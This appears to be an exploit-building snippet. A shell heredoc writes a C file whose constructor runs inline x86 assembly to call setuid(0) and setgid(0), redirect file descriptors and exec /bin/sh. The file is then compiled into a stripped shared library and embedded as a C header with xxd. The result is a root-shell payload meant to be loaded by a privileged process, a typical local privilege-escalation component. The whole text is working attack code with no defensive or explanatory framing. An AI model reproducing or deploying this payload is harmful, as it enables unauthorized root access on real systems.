cat > la.c << "EOF"

static void __attribute__ ((constructor)) _init (void) {

    __asm__ __volatile__ (

    "addl $64, %esp;"

    // setuid(0);

    "movl $23, %eax;"

    "movl $0, %ebx;"

    "int $0x80;"

    // setgid(0);

    "movl $46, %eax;"

    "movl $0, %ebx;"

    "int $0x80;"

    // dup2(0, 1);

    "movl $63, %eax;"

    "movl $0, %ebx;"

    "movl $1, %ecx;"

    "int $0x80;"

    // dup2(0, 2);

    "movl $63, %eax;"

    "movl $0, %ebx;"

    "movl $2, %ecx;"

    "int $0x80;"

    // execve("/bin/sh");

    "movl $11, %eax;"

    "pushl $0x0068732f;"

    "pushl $0x6e69622f;"

    "movl %esp, %ebx;"

    "movl $0, %edx;"

    "pushl %edx;"

    "pushl %ebx;"

    "movl %esp, %ecx;"

    "int $0x80;"

    // exit(0);

    "movl $1, %eax;"

    "movl $0, %ebx;"

    "int $0x80;"

    );

}

EOF

gcc -fpic -shared -nostdlib -Os -s -o la.so la.c

xxd -i la.so > la.so.h
